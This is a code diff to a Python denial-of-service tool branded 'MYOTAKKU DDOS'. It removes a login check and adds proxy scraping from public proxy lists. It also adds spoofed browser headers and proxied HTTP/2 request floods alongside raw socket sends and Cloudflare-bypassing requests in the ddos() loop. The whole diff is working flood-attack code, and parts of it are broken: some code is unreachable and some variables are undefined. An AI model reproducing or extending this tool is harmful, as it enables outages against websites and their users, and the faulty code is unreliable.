@@ -35,22 +35,6 @@ os.system(f"title MYOTAKKU DDOS User Online : [{on1}] \ Client : [{cl}] \ Exp : 
 print("[0] Checking Clients .......")
 time.sleep(5)
 print("[0] Loading ......")
-time.sleep(5)
-
-pasw = "netrocyber"
-
-for i in range(3):
-    pwd = ("netrocyber")
-    j = 3
-    if (pwd == pasw):
-        time.sleep(3)
-        print("[0] Loading....... \n")
-        break
-    else:
-        time.sleep(2)
-        print("[x] Password mu salah \n")
-        continue
-time.sleep(2)
 print("[0] Berhasil Login Menggunakan Akun OTAKKUTeams")
 time.sleep(2)
 
@@ -1794,6 +1778,25 @@ def socksCrawler():
         except:
             pass
     f.close()
+
+proxyResourca = [
+    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all',
+    'https://www.proxy-list.download/api/v1/get?type=http',
+    'https://www.proxyscan.io/download?type=socks5',
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+]
+
+socksFilez= ("proxy.txt")
+#GET SOCKS
+def socksCrawlz():
+    global socksFilez, socksResourca
+    f = open(socksFilez,'wb')
+    for urs in proxyResourca:
+        try:
+            f.write(requests.get(urs).content)
+        except:
+            pass
+    f.close()
     
 socks5 = [
  """184.181.217.204:4145
@@ -2419,6 +2422,24 @@ def get_proxies():
         return False
     proxies = open("socks5.txt", 'r').read().split('\n')
     return True
+    proxz = open("proxy.txt", 'r').read().split('\n')
+    return True
+
+    headers = {
+            'User-Agent': random.choice(useragents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'TE': 'trailers',
+            }
     
 
 def Headers(method):
@@ -2450,6 +2471,7 @@ def Headers(method):
 
 def ddos():
     socksCrawler()
+    socksCrawlz()
     scraper = cloudscraper.create_scraper()
     req =  "GET / HTTP/1.1\r\nHost: " + urlparse(ip).netloc + "\r\n"
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -2483,14 +2505,23 @@ def ddos():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((ip,port))
+            client = httpx.Client(
+                http2=True,
+                proxies={
+                    'http://': 'http://'+random.choice(proxz),
+                    'https://': 'http://'+random.choice(proxz),
+                }
+             )
+            client.get(ip, headers=headers)
+            client.get(ip, headers=headers)
             proxy = {
                     'http': 'http://'+str(random.choice(list(proxies))),   
                     'https': 'http://'+str(random.choice(list(proxies))),
             }
-            scraper.get(url, proxies=proxy)
-            scraper.get(url, proxies=proxy)
-            scraper.get(url, proxies=proxy)
-            scraper.get(url, proxies=proxy)
+            scraper.get(ip, proxies=proxy)
+            scraper.get(ip, proxies=proxy)
+            scraper.get(ip, proxies=proxy)
+            scraper.get(ip, proxies=proxy)
             s.send(data)
             s.send(data)
             s.send(data)
